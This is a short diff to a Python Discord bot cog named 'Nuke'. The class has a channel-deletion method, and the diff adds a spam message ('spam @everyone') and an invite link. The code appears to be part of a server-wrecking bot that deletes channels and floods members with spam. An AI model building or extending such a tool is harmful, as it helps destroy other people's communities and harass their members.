@@ -4,6 +4,8 @@ from discord.ext import commands
 class Nuke(commands.Cog):
     def __init__(self, bot):
         self.bot = bot
+        self.message = "spam @everyone"
+        self.invites = "https://discord.gg/cbtAzt"
 
     async def delete_channels(self, ctx):
         print("Deleted channels ( ", end='', flush=True)
